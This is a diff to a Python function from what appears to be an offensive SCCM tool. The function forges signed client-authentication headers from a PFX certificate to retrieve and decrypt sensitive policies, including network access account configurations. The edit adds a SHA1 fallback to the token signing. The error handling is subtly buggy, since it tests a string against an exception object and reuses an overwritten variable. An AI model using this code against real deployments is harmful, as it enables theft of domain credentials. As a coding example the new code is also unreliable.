@@ -494,21 +494,35 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
     print('[+] Generating Client Authentication headers using PFX File...')
 
     data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
-    #CCMClientIDSignature = generateSignedData(data,cryptoProv)
-    CCMClientIDSignature = str(generateClientTokenSignature(data,cryptoProv))
-    print("[+] CCMClientID Signature Generated")
+    try:
+        CCMClientIDSignature = str(generateClientTokenSignature(data, cryptoProv))
+        print("[+] CCMClientID Signature Generated")
 
-    CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat()+'Z'
-    data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
-    #CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
-    CCMClientTimestampSignature = str(generateClientTokenSignature(data,cryptoProv))
-    print("[+] CCMClientTimestamp Signature Generated")
+        CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
+        data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
+        CCMClientTimestampSignature = str(generateClientTokenSignature(data, cryptoProv))
+        print("[+] CCMClientTimestamp Signature Generated")
 
-    data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
-    #clientTokenSignature = str(generateSignedData(data,cryptoProv))
-    clientTokenSignature = str(generateClientTokenSignature(data,cryptoProv))
-    
-    print("[+] ClientToken Signature Generated")
+        data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
+        clientTokenSignature = str(generateClientTokenSignature(data, cryptoProv))
+        print("[+] ClientToken Signature Generated")
+    except BaseException as e:
+        if "Invalid algorithm specified" in e:
+            print("Error. Trying again with SHA1 instead of SHA256.")
+
+            CCMClientIDSignature = generateSignedData(data,cryptoProv)
+            print("[+] CCMClientID Signature Generated")
+
+            CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
+            data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
+            CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
+            print("[+] CCMClientTimestamp Signature Generated")
+
+            data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
+            clientTokenSignature = str(generateSignedData(data,cryptoProv))
+            print("[+] ClientToken Signature Generated")
+        else:
+            print(e)
     
     try:
         naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature)
